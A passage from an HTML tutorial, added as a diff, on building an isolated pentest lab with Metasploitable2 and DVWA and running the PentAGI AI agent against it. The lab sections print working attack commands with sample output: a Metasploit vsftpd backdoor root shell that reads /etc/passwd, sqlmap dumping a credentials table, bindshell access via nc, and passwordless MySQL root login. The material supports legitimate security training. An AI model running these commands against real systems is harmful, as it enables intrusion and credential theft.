+                            <li>Follow the installer (language, timezone, disk partitioning — use defaults).</li>
+                            <li>Create a strong user password.</li>
+                            <li>Complete installation → reboot
+                                .</li>
+                        </ol>
+                    </div>
+                    <h4>Step 5 — Post-Install Setup</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Update everything
+sudo apt update && sudo apt full-upgrade -y
+
+# Install VirtualBox Guest Additions (better screen/clipboard)
+sudo apt install -y virtualbox-guest-x11
+sudo reboot
+
+# Verify both network interfaces are active
+ip addr show
+# Should see: eth0 (NAT) and eth1 (Host-Only 192.168.56.x)</code></pre>
+                    </div>
+                    <h4>Step 6 — Assign Static IP to eth1/h4>
+                        <div id="language-bash" class="code-block">
+                            <div class="title">
+                                <p>Bash</p>
+                            </div>
+                            <pre>
+<code class="language-bash">sudo nano /etc/network/interfaces</code></pre>
+                        </div>
+                        <p><strong>Add:</strong></p>
+                        <div class="bg-color">
+                            <pre>
+auto eth1
+iface eth1 inet static
+  address 192.168.56.10
+  netmask 255.255.255.0</pre>
+                        </div>
+                        <div id="language-bash" class="code-block">
+                            <div class="title">
+                                <p>Bash</p>
+                            </div>
+                            <pre>
+<code class="language-bash">sudo systemctl restart networking
+ip addr show eth1
+# Should display: inet 192.168.56.10/24</code></pre>
+                        </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 5 — Metasploitable2 Setup (Target Machine)</h3>
+                    <h4>Step 1 — Download Metasploitable2</h4>
+                    <p>Go to <a href="https://sourceforge.net/projects/metasploitable/" class="link">SourceForge</a> →
+                        download
+                        metasploitable-linux-2.0.0.zip (~800 MB).
+                    </p>
+                    <h4>Step 2 — Extract</h4>
+                    <div class="bg-color">
+                        <pre>
+Windows: Right-click → Extract All
+Linux: unzip metasploitable-linux-2.0.0.zip</pre>
+                    </div>
+                    <h4>Step 3 — Create VM in VirtualBox</h4>
+                    <div class="bg-color">
+                        <pre>
+VirtualBox → [New]
+  Name: Metasploitable2-Target
+  Type: Linux
+  Version: Ubuntu (64-bit)
+  RAM: 512 MB
+  
+  Hard Disk screen:
+    ○ Use an existing virtual hard disk file
+    → Browse → select Metasploitable.vmdk
+  
+  Click [Create]</pre>
+                    </div>
+                    <h4>Step 4 — Configure Network (CRITICAL)</h4>
+                    <div class="bg-color">
+                        <pre>
+Metasploitable2 VM → Settings → Network
+
+  Adapter 1:
+    ☑ Enable
+    Attached to: Host-only Adapter
+    Name: vboxnet0
+    
+  ⚠️ DO NOT enable NAT or Bridged adapter
+     This VM must NEVER have internet access</pre>
+                    </div>
+                    <h4>Step 5 — Boot and Verify</h4>
+                    <div class="list">
+                        <p>Start the VM Login:</p>
+                        <ul>
+                            <li>Username: msfadmin</li>
+                            <li>Password: msfadmin</li>
+                        </ul>
+                    </div>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Check its IP (should be from DHCP: 192.168.56.101)
+ifconfig eth0
+
+# Test connectivity from Kali (in Kali terminal)
+ping 192.168.56.101 -c 4</code></pre>
+                    </div>
+                    <hr>
+
+                    <div class="content">
+                        <h3>Part 6 — DVWA Setup (Web App Target)</h3>
+                        <p>Run DVWA as a Docker container directly on Kali — no extra VM needed.</p>
+                        <div id="language-bash" class="code-block">
+                            <div class="title">
+                                <p>Bash</p>
+                            </div>
+                            <pre>
+<code class="language-bash"># Install Docker Properly
+sudo apt install -y docker.io
+sudo systemctl start docker
+sudo systemctl enable docker
+docker --version
+
+
+# Pull and run DVWA
+docker pull vulnerables/web-dvwa
+docker run -d \
+  --name dvwa \
+  -p 8080:80 \
+  --restart unless-stopped \
+  vulnerables/web-dvwa
+
+# Verify it's running
+docker ps</code></pre>
+                        </div>
+                        <p><strong>Access: </strong>http://localhost:8080</p>
+                        <p class="sub"><strong class="subtitle">Alternative: Use Lightweight Lab (Smart Move)</strong>
+                        </p>
+                        <p>Instead of fighting this:</p>
+                        <div id="language-bash" class="code-block">
+                            <div class="title">
+                                <p>Bash</p>
+                            </div>
+                            <pre>
+<code class="language-bash">docker run -d -p 3000:3000 bkimminich/juice-shop</code></pre>
+                        </div>
+                        <p>Inside Kali browser:</p>
+                        <div class="bg-color">
+                            <pre>
+http://localhost:3000
+OR from host (if configured properly):
+http://<kali-ip>:3000</pre>
+                        </div>
+                        <p><strong>First-time configuration:</strong></p>
+                        <div class="list">
+                            <ol>
+                                <li>Login: admin / password</li>
+                                <li>Scroll to the bottom → click Create / Reset Database.</li>
+                                <li>Login again with same credentials.</li>
+                                <li>Navigate to DVWA Security → set level to Low.</li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 7 — PentAGI Installation on Kali Linux</h3>
+                    <h4>Step 1 — Install Docker and Docker Compose</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Install dependencies
+sudo apt install -y docker.io docker-compose curl wget unzip
+
+# Enable and start Docker
+sudo systemctl enable docker
+sudo systemctl start docker
+
+# Add your user to the docker group
+sudo usermod -aG docker $USER
+newgrp docker
+
+# Confirm Docker works
+docker --version
+docker compose version
+docker ps</code></pre>
+                    </div>
+                    <h4>Step 2 — Create PentAGI Directory</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash">mkdir -p ~/pentagi && cd ~/pentagi</code></pre>
+                    </div>
+                    <h4>Step 3 — Download PentAGI Installer</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Linux 64-bit (amd64)
+wget -O installer.zip \
+  https://pentagi.com/downloads/linux/amd64/installer-latest.zip
+
+# Extract
+unzip installer.zip
+
+# Make executable
+chmod +x ./installer</code></pre>
+                    </div>
+                    <h4>Step 4 — Run the Interactive Installer</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash">sudo ./installer</code></pre>
+                    </div>
+                    <p class="sub"><strong class="subtitle">The installer runs 6 automated steps in the terminal
+                            UI:</strong></p>
+                    <div class="bg-color">
+                        <pre>
+PentAGI Interactive Installer
+══════════════════════════════
+
+<span class="cyan">[1/6]</span> System Checks
+  ✓ Docker version: 27.x.x
+  ✓ Docker Compose: v2.x.x
+  ✓ CPU cores: 4
+  ✓ Available RAM: 6.0 GB
+  ✓ Disk space: 45 GB free
+  ✓ Port 8443: available
+  ✓ Port 5432: available
+  ✓ Port 7687: available
+
+<span class="cyan">[2/6]</span> Environment Setup
+  → Creating .env configuration...
+  → Generating secure random credentials...
+  ✓ .env file created
+
+<span class="cyan">[3/6]</span> LLM Provider Configuration
+  Select your AI provider:
+  [1] OpenAI (GPT-4.1, o-series)
+  [2] Anthropic (Claude)
+  [3] Google Gemini
+  [4] AWS Bedrock
+  [5] Ollama (local, free, private) ← Recommended for lab
+  [6] Custom OpenAI-compatible
+  
+  Enter choice [1-6]: _
+
+<span class="cyan">[4/6]</span> Search Engine Configuration
+  → DuckDuckGo: Enabled (no key required)
+  Tavily API key (optional, press ENTER to skip): _
+
+<span class="cyan">[5/6]</span> Security Hardening
+  → Auto-generating PostgreSQL password...
+  → Auto-generating Neo4j password...
+  → Generating cookie signing salt...
+  → Setting admin credentials...
+  ✓ Security configuration complete
+
+<span class="cyan">[6/6]</span> Deployment
+  → Pulling Docker images (this may take 5–10 min)...
+  → Starting all services...
+  ✓ All services running
+
+══════════════════════════════
+  PentAGI is ready!
+  URL: https://localhost:8443
+  Email: admin@pentagi.com
+  Password: admin (CHANGE THIS NOW)
+══════════════════════════════</pre>
+                    </div>
+                    <h4>Step 5 — Verify Installation</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Check all containers are healthy
+docker compose ps</code></pre>
+                    </div>
+                    <h4>Step 6 — Access the UI</h4>
+                    <p>Open Kali's browser:</p>
+                    <div class="bg-color">
+                        <pre>
+https://localhost:8443</pre>
+                    </div>
+                    <p>Your browser shows an SSL warning — this is normal (self-signed certificate). Click Advanced →
+                        Proceed to localhost.
+                    </p>
+
+                    <div class="list">
+                        <p><strong>Login:</strong></p>
+                        <ul>
+                            <li>Email: admin@pentagi.com</li>
+                            <li>Password: admin</li>
+                        </ul>
+                    </div>
+                    <p>Immediately change the default password:</p>
+                    <div class="bg-color">
+                        <pre>
+Profile icon (top right) → Security → Change Password</pre>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 8 — Configuration</h3>
+                    <h4>Manual .env Configuration</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash">cd ~/pentagi
+nano .env</code></pre>
+                    </div>
+                    <h4>LLM API Keys</h4>
+                    <div class="bg-color">
+                        <pre>
+# OpenAI
+OPEN_AI_KEY=sk-your_openai_key_here
+
+# Anthropic
+ANTHROPIC_API_KEY=sk-ant-your_key_here
+
+# Google Gemini
+GEMINI_API_KEY=your_gemini_key_here
+
+# Ollama (free, local — best for privacy)
+OLLAMA_SERVER_URL=http://host.docker.internal:11434
+OLLAMA_SERVER_MODEL=llama3.1:8b-instruct-q8_0</pre>
+                    </div>
+                    <h4>Setting up Ollama (free local LLM):</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Install Ollama on Kali
+curl -fsSL https://ollama.ai/install.sh | sh
+
+# Pull a capable model (requires ~5 GB disk)
+ollama pull llama3.1:8b-instruct-q8_0
+
+# Verify it works
+ollama run llama3.1:8b-instruct-q8_0 "Hello, are you working?"</code></pre>
+                    </div>
+                    <h4>Search Engine Configuration</h4>
+                    <div class="bg-color">
+                        <pre>
+# DuckDuckGo — enabled by default, no key required
+DUCKDUCKGO_ENABLED=true
+
+# Tavily — deeper OSINT (optional)
+TAVILY_API_KEY=tvly-your_key_here</pre>
+                    </div>
+                    <h4>Apply Configuration Changes</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash">docker compose down
+docker compose up -d
+docker compose ps</code></pre>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 9 — Basic Usage (Beginner Level)</h3>
+                    <div class="bg-color">
+                        <pre>
+Left Sidebar:
+├── Flows          → Create and manage pentest sessions
+├── Assistants     → Custom AI personas with pre-configured behavior
+├── Reports        → View and export completed test reports
+├── Settings       → System configuration, API keys
+└── Profile        → Password and account management</pre>
+                    </div>
+                    <h4>Creating Your First Flow</h4>
+                    <div class="list">
+                        <ol>
+                            <li>Click Flows → + New Flow</li>
+                            <li>Fill in:</li>
+                            <div class="bg-color">
+                                <pre>
+Name: My First Test
+Description: Lab practice on authorized Metasploitable2 VM</pre>
+                            </div>
+                            <li>In the Objective field, type a simple starting task:</li>
+                            <div class="bg-color">
+                                <pre>
+Run a basic port scan on 192.168.56.101.
+Show me all open ports and the service running on each.
+Explain what each service is and why it might be interesting
+from a security perspective.</pre>
+                            </div>
+                            <li>Click Start Flow</li>
+                        </ol>
+                    </div>
+                    <h4>Understanding Basic Output</h4>
+                    <p>Expand the flow to see the task tree:</p>
+                    <div class="bg-color">
+                        <pre>
+Flow: My First Test  [Active]
+└── Task 1: Port Scan (Nmap)  [Completed ✓]
+    ├── Action: nmap -sV -sC 192.168.56.101
+    ├── Duration: 47 seconds
+    └── Output: [click to expand full Nmap results]</pre>
+                    </div>
+                    <p>Below the task tree, you'll see the AI annotation layer — a plain-English summary of what PentAGI
+                        found and why each
+                        open port matters. This is the core value: raw scan output + contextual interpretation combined.
+                    </p>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 10 — Practical Hands-On Lab</h3>
+                    <h4>Lab 1 — Reconnaissance on Metasploitable2</h4>
+                    <p>Go to Flows → + New Flow. Set the target and paste this objective:</p>
+                    <div class="bg-color">
+                        <pre>
+Perform full reconnaissance on 192.168.56.101.
+
+1. Run a complete Nmap scan:
+   - Scan all 65535 ports
+   - Detect service versions (-sV)
+   - Run default scripts (-sC)
+   - Perform OS fingerprinting (-O)
+
+2. For each discovered service:
+   - Identify the software name and version
+   - Note the port and protocol
+   - Flag any outdated or potentially vulnerable versions
+
+3. Run the Nmap vuln script category:
+   nmap --script vuln 192.168.56.101
+
+4. Summarize all findings in a structured table:
+   Port | Service | Version | Risk Level | Notes</pre>
+                    </div>
+                    <p>Click Start Flow and watch the agents work.</p>
+                    <p><strong>Expected Nmap output PentAGI parses:</strong></p>
+                    <div class="bg-color">
+                        <pre>
+PORT      STATE SERVICE     VERSION
+21/tcp    open  ftp         vsftpd 2.3.4
+22/tcp    open  ssh         OpenSSH 4.7p1 Debian
+23/tcp    open  telnet      Linux telnetd
+25/tcp    open  smtp        Postfix smtpd
+80/tcp    open  http        Apache httpd 2.2.8
+111/tcp   open  rpcbind     2 (RPC #100000)
+139/tcp   open  netbios-ssn Samba smbd 3.0.20
+445/tcp   open  netbios-ssn Samba smbd 3.0.20
+512/tcp   open  exec        netkit-rsh rexecd
+513/tcp   open  login       OpenBSD or Solaris rlogind
+514/tcp   open  shell       Netkit rshd
+1099/tcp  open  java-rmi    GNU Classpath grmiregistry
+1524/tcp  open  bindshell   Metasploitable root shell
+2049/tcp  open  nfs         2-4 (RPC #100003)
+3306/tcp  open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp  open  postgresql  PostgreSQL DB 8.3.0-8.3.7
+5900/tcp  open  vnc         VNC (protocol 3.3)
+6000/tcp  open  X11         (access denied)
+6667/tcp  open  irc         UnrealIRCd
+8180/tcp  open  http        Apache Tomcat/Coyote JSP engine
+OS: Linux 2.6.X</pre>
+                    </div>
+                    <div class="list">
+                        <p class="sub"><strong class="subtitle">What PentAGI's AI flags automatically:</strong></p>
+                        <ul>
+                            <li><code class="code">vsftpd 2.3.4</code> → ⚠️ Known backdoor (CVE-2011-2523, CVSS 10.0).
+                            </li>
+                            <li><code class="code">Samba 3.0.20</code> → ⚠️ Username map script injection
+                                (CVE-2007-2447, CVSS 9.3).
+                            </li>
+                            <li><code class="code">Port 1524</code> → ⚠️ Bindshell — direct root shell listener, no
+                                exploit
+                                needed.</li>
+                            <li><code class="code">MySQL 5.0.51a</code> → ⚠️ Likely empty root password.</li>
+                            <li><code class="code">UnrealIRCd</code> → ⚠️ Backdoor version (CVE-2010-2075, CVSS 7.5).
+                            </li>
+                        </ul>
+                    </div>
+
+                    <h4>Lab 2 — Vulnerability Scanning on DVWA</h4>
+                    <p>Create a new flow targeting the web app:</p>
+                    <div class="bg-color">
+                        <pre>
+Perform a web application security assessment on http://localhost:8080/dvwa/
+
+Authentication: admin / password (security level: low)
+Session cookie will need to be provided.
+
+Test the following vulnerability categories:
+
+1. SQL Injection
+   - Target: /dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
+   - Use sqlmap to enumerate databases, tables, and dump the users table
+
+2. Command Injection
+   - Target: /dvwa/vulnerabilities/exec/
+   - Test for OS command injection in the ping input field
+   - Attempt to read /etc/passwd using injection
+
+3. Directory/File Enumeration
+   - Use gobuster to discover hidden files and directories
+   - Wordlist: /usr/share/wordlists/dirb/common.txt
+
+4. Cross-Site Scripting (XSS)
+   - Test reflected XSS on all input fields
+   - Test stored XSS on message/comment fields
+
+Report all findings with:
+- Vulnerability type
+- Affected URL and parameter
+- Payload used as proof-of-concept
+- Risk rating (Critical/High/Medium/Low)</pre>
+                    </div>
+                    <p><strong>What PentAGI runs internally:</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Directory enumeration
+gobuster dir \
+  -u http://localhost:8080/dvwa/ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -o gobuster_results.txt
+
+# SQL injection
+sqlmap \
+  -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=<your_session_id>; security=low" \
+  --dbs \
+  --batch \
+  --random-agent
+
+# After DB enumeration:
+sqlmap \
+  -u "http://localhost:8080/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="PHPSESSID=<your_session_id>; security=low" \
+  -D dvwa -T users --dump --batch</code></pre>
+                    </div>
+                    <p><strong>Expected sqlmap output PentAGI shows you:</strong></p>
+                    <div class="bg-color">
+                        <pre>
+[*] Database: dvwa
+[*] Table: users
+
++----+----------+---------------------------------------------+
+| id | user     | password                                    |
++----+----------+---------------------------------------------+
+| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 (password) |
+| 2  | gordonb  | e99a18c428cb38d5f260853678922e03 (abc123)   |
+| 3  | 1337     | 8d3533d75ae2c3966d7e0d4fcc69216b (charley)  |
+| 4  | pablo    | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein)  |
++----+----------+---------------------------------------------+</pre>
+                    </div>
+
+                    <h4>Lab 3 — Exploitation (Lab Environment Only)</h4>
+                    <p>Create a new flow for controlled exploitation:</p>
+                    <div class="bg-color">
+                        <pre>
+Exploit the following confirmed vulnerabilities on 192.168.56.101.
+This is an authorized lab environment (Metasploitable2).
+
+1. Exploit vsftpd 2.3.4 backdoor (CVE-2011-2523):
+   - Use Metasploit module: exploit/unix/ftp/vsftpd_234_backdoor
+   - RHOST: 192.168.56.101
+   - If shell obtained: run "id", "whoami", "uname -a"
+
+2. Access MySQL without credentials:
+   - Connect: mysql -h 192.168.56.101 -u root
+   - If connected: SHOW DATABASES; SELECT user,password FROM mysql.user;
+
+3. Access the bindshell on port 1524:
+   - Connect: nc 192.168.56.101 1524
+   - Run basic enumeration commands
+
+For each successful exploitation, record:
+- Exact command used
+- Output received
+- Access level achieved (user/root)
+- Screenshot/log evidence</pre>
+                    </div>
+                    <p class="sub"><strong class="subtitle">PentAGI internally orchestrates:</strong></p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># vsftpd backdoor via Metasploit
+msfconsole -q -x "
+  use exploit/unix/ftp/vsftpd_234_backdoor;
+  set RHOST 192.168.56.101;
+  set RPORT 21;
+  run;
+  id;
+  uname -a;
+  cat /etc/passwd;
+  exit
+"</code></pre>
+                    </div>
+                    <p><strong>Expected shell output:</strong></p>
+                    <div class="bg-color">
+                        <pre>
+[*] Banner: 220 (vsFTPd 2.3.4)
+[*] USER: 331 Please specify the password.
+[+] Backdoor service has been spawned, handling...
+[+] UID: uid=0(root) gid=0(root)
+[*] Command shell session 1 opened (192.168.56.10:4444 → 192.168.56.101:6200)
+
+id
+uid=0(root) gid=0(root)
+
+uname -a
+Linux metasploitable 2.6.24-16-server #1 SMP</pre>
+                    </div>
+                    <p><strong>Technical explanation:</strong> vsftpd 2.3.4 contains a deliberately planted backdoor —
+                        not a bug. When a
+                        username containing <code class="code">:)</code>
+                        is sent, the daemon spawns <code class="code">/bin/sh</code> bound to port 6200 with root (UID
+                        0) privileges. No password,
+                        no exploit chain —
+                        direct root. This is why version management matters enormously.</p>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 11 — Pentesting Workflow with PentAGI</h3>
+                    <h4>Phase 1 — RECON (Reconnaissance)</h4>
+                    <p class="subt">What can we find out about the target?</p>
+                    <p style="padding-top: 10px;">PentAGI starts by collecting information — like a detective doing
+                        background
+                        research before
+                        taking action.</p>
+                    <div class=" list">
+                        <ul>
+                            <li>Scans which ports/doors are open.</li>
+                            <li>Identifies what operating system is running.</li>
+                            <li>Gathers public information (OSINT).</li>
+                            <li>Maps the website structure.</li>
+                        </ul>
+                    </div>
+
+                    <h4>Phase 2 — SCAN (Search for Weaknesses)</h4>
+                    <p class="subt">Where are the vulnerabilities?</p>
+                    <p style="padding-top: 10px;">Now PentAGI runs professional hacking tools automatically to probe
+                        every discovered service for known weaknesses.</p>
+                    <div class=" list">
+                        <ul>
+                            <li><strong>Nikto</strong> — checks the web server for issues.</li>
+                            <li><strong>sqlmap</strong> — tests for database injection flaws.</li>
+                            <li><strong>gobuster</strong> — discovers hidden pages and folders.</li>
+                            <li><strong>NSE scripts + OpenVAS</strong> — deep vulnerability checks.</li>
+                        </ul>
+                    </div>
+
+                    <h4>Phase 3 — ANALYZE (Think and Plan)</h4>
+                    <p class="subt">How serious are these vulnerabilities?</p>
+                    <p style="padding-top: 10px;">This is where PentAGI's AI brain processes all the scan results and
+                        builds an attack strategy.</p>
+                    <div class=" list">
+                        <ul>
+                            <li>Looks up CVEs (known vulnerability records) for every finding.</li>
+                            <li>Scores each vulnerability using CVSS (low / medium / high / critical).</li>
+                            <li>Maps how vulnerabilities connect to each other to find deeper attack paths.</li>
+                        </ul>
+                    </div>
+
+                    <h4>Phase 4 — EXPLOIT (Attack — Split Between AI and You)</h4>
+                    <p class="subt">Can we actually break in?</p>
+                    <p style="padding-top: 10px;">This phase has two tracks:</p>
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>🤖 PentAGI Does</th>
+                                    <th>👤 You Do (Manual Mastery)</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>Known CVE exploits</td>
+                                    <td>Business logic flaws</td>
+                                </tr>
+                                <tr>
+                                    <td>Automated Metasploit attacks</td>
+                                    <td>Authentication bypass</td>
+                                </tr>
+                                <tr>
+                                    <td>Captures shell access</td>
+                                    <td>Chained zero-days</td>
+                                </tr>
+                                <tr>
+                                    <td>Logs proof-of-concept</td>
+                                    <td>Custom payloads</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+                    <p>Simple rule: If there is a known published exploit → PentAGI handles it. If it requires creative
+                        thinking → You handle
+                        it.
+                    </p>
+
+                    <h4>Phase 5 — REPORT (Document Everything)</h4>
+                    <p class="subt">What did we find and how do we fix it?</p>
+                    <p style="padding-top: 10px;">PentAGI automatically writes a full professional report — no manual
+                        writing needed.</p>
+                    <div class=" list">
+                        <ul>
+                            <li><strong>HTML</strong> — tests for database injection flaws.</li>
+                            <li><strong>JSON</strong> — for developers and integrations.</li>
+                            <li><strong>MD</strong> — for documentation platforms.</li>
+                        </ul>
+                    </div>
+                    <p>The report includes:</p>
+                    <div class=" list">
+                        <ul>
+                            <li>Executive summary (for managers/clients).</li>
+                            <li>Full CVE findings table.</li>
+                            <li>Severity ratings.</li>
+                            <li>Fix recommendations</li>
+                        </ul>
+                    </div>
+
+                    <div class="card-image-output">
+                        <img src="images/pentesting-workflow-with-pentagi.webp" alt=" Pentesting Workflow with PentAGI">
+                    </div>
+                    <p class="sub"><strong class="subtitle">The Flow at a Glance</strong></p>
+                    <div class="bg-color">
+                        <pre>
+RECON ──PentAGI──► SCAN ──PentAGI──► ANALYZE ──PentAGI──► EXPLOIT ──PentAGI──► REPORT
+  │                  │                   │              AI: Known CVEs         │
+Full auto          Full auto          Full auto        YOU: Logic/0-day      Full auto</pre>
+                    </div>
+                    <p class="sub"><strong class="subtitle">💡 The Key Idea</strong></p>
+                    <p>PentAGI does the repetitive, time-consuming 80% automatically. <br>You focus on the creative,
+                        complex
+                        20% that only humans can do.</p>
+                    <div class="list">
+                        <h4>Where PentAGI Handles Everything</h4>
+                        <ul>
+                            <li>Initial network and web reconnaissance.</li>
+                            <li>Version detection and CVE cross-referencing.</li>
+                            <li>Known-exploit execution via Metasploit.</li>
+                            <li>Credential brute-forcing against common services.</li>
+                            <li>Report generation with CVSS scores and remediation.</li>
+                        </ul>
+                    </div>
+                    <div class="list">
+                        <h4>Where You Must Add Manual Work</h4>
+                        <ul>
+                            <li>Understanding why a vulnerability exists (not just that it does).</li>
+                            <li>Business logic and application-flow attacks.</li>
+                            <li>Bypassing hardened WAFs, EDRs, and modern security controls.</li>
+                            <li>Complex post-exploitation and lateral movement.</li>
+                            <li>Client communication and risk contextualization.</li>
+                        </ul>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 12 — Generating and Exporting the Report</h3>
+                    <div class="list">
+                        <p>Once a flow shows Completed status:</p>
+                        <ol>
+                            <li>Flows → Select your flow → Export</li>
+                            <li>Choose format: HTML (for sharing), JSON (for integrations), Markdown (for
+                                documentation/blogs)</li>
+                        </ol>
+                    </div>
+                    <p><strong>Report structure overview:</strong></p>
+                    <div class="bg-color">
+                        <pre>
+═══════════════════════════════════════════════════════
+PENTAGI PENETRATION TEST REPORT
+Target: 192.168.56.101 (Metasploitable2)
+Date: April 16, 2026
+Risk Rating: ██████████ CRITICAL
+═══════════════════════════════════════════════════════
+
+EXECUTIVE SUMMARY
+  Critical:  3 findings
+  High:      2 findings
+  Medium:    2 findings
+  Low:       1 finding
+
+FINDINGS
+
+  [CRIT-001] vsftpd 2.3.4 Backdoor
+  CVE-2011-2523 | CVSS: 10.0 | Port 21
+  Impact: Unauthenticated remote root shell
+  PoC: [command output attached]
+  Fix: Upgrade vsftpd to 3.0.5+; verify binary checksums
+
+  [CRIT-002] MySQL Empty Root Password  
+  CVE: N/A | CVSS: 9.8 | Port 3306
+  Impact: Full unauthenticated database access
+  PoC: mysql -h 192.168.56.101 -u root (no password)
+  Fix: Set root password; bind MySQL to 127.0.0.1 only
+
+  [CRIT-003] Samba Username Map Injection
+  CVE-2007-2447 | CVSS: 9.3 | Port 139/445
+  Impact: Unauthenticated remote root shell
+  PoC: [Metasploit output attached]
+  Fix: Upgrade Samba; remove 'username map script' option
+
+  [HIGH-001] Bindshell on Port 1524
+  CVE: N/A | CVSS: 8.8
+  Impact: Direct root shell — no exploit required
+  Fix: Disable/firewall port 1524 immediately
+
+  [HIGH-002] SQL Injection (DVWA)
+  CVE: N/A | CVSS: 8.8 | /dvwa/vulnerabilities/sqli/
+  Impact: Full database dump including user credentials
+  Fix: Use parameterized queries / prepared statements
+
+APPENDIX
+  Full tool output, Nmap scans, sqlmap logs
+═══════════════════════════════════════════════════════</pre>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 13 — Common Mistakes</h3>
+                    <h4>Mistake 1 — Misconfigured Network Adapters</h4>
+                    <div class="bg-color">
+                        <pre>
+❌ Wrong:  Metasploitable2 on Bridged Adapter
+           → It joins your real network and gets a real IP
+           → Anyone on your LAN can access it (dangerously open)
+
+✓ Correct: Metasploitable2 on Host-Only Adapter ONLY
+           → Completely isolated, invisible to external networks</pre>
+                    </div>
+                    <h4>Mistake 2 — Running Tools on Unauthorized Networks</h4>
+                    <p>Even accidentally pointing PentAGI at your router's IP (e.g., 192.168.1.1) violates terms of
+                        service and potentially
+                        law. Always double-check your target IP before launching any flow.</p>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Before every scan, verify your target is your lab VM:
+ping 192.168.56.101 # Should respond
+traceroute 192.168.56.101 # Should show 1 hop (direct, no internet routing)</code></pre>
+                    </div>
+                    <h4>Mistake 3 — Trusting AI Output Without Validation</h4>
+                    <p>PentAGI can generate false positives — flagging a vulnerability that isn't actually exploitable
+                        in context. Never
+                        include a finding in a professional report without manually reproducing it. The AI is a starting
+                        point, not a final
+                        verdict.</p>
+                    <h4>Mistake 4 — Missing LLM API Key or Wrong Format</h4>
+                    <div class="bg-color">
+                        <pre>
+# Wrong — quotes around the key cause parse errors
+OPEN_AI_KEY="sk-your_key_here"
+
+# Correct — no quotes
+OPEN_AI_KEY=sk-your_key_here</pre>
+                    </div>
+                    <h4>Mistake 5 — Forgetting to Restart After .env Changes</h4>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># After any .env edit, always:
+docker compose down && docker compose up -d</code></pre>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 14 — Useful Management Commands</h3>
+                    <div id="language-bash" class="code-block">
+                        <div class="title">
+                            <p>Bash</p>
+                        </div>
+                        <pre>
+<code class="language-bash"># Navigate to PentAGI directory
+cd ~/pentagi
+
+# Start all services
+docker compose up -d
+
+# Stop all services (data preserved)
+docker compose down
+
+# Full reset (wipes all data)
+docker compose down -v
+
+# Live log stream
+docker compose logs -f pentagi
+
+# Check container health
+docker compose ps
+
+# Restart just the backend
+docker compose restart pentagi
+
+# Check resource usage
+docker stats
+
+# Check for port conflicts
+sudo ss -tlnp | grep -E ':(8443|5432|7687|6379)'
+
+# Helpful aliases — add to ~/.bashrc
+echo 'alias pentagi-up="cd ~/pentagi && docker compose up -d"' >> ~/.bashrc
+echo 'alias pentagi-down="cd ~/pentagi && docker compose down"' >> ~/.bashrc
+echo 'alias pentagi-logs="cd ~/pentagi && docker compose logs -f pentagi"' >> ~/.bashrc
+source ~/.bashrc</code></pre>
+                    </div>
+                </div>
+                <hr>
+
+                <div class="content">
+                    <h3>Part 15 — Troubleshooting</h3>
+                    <div class="table-container">
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Error</th>
+                                    <th>Cause</th>
+                                    <th>Fix</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>permission denied: docker.sock</td>
+                                    <td>User not in docker group</td>
+                                    <td><code class="code">sudo usermod -aG docker $USER && newgrp docker</code></td>
+                                </tr>
+                                <tr>
+                                    <td>Container shows unhealthy</td>
+                                    <td>Invalid API key</td>
+                                    <td>Check <code class="code">.env</code> — no quotes, no extra spaces</td>
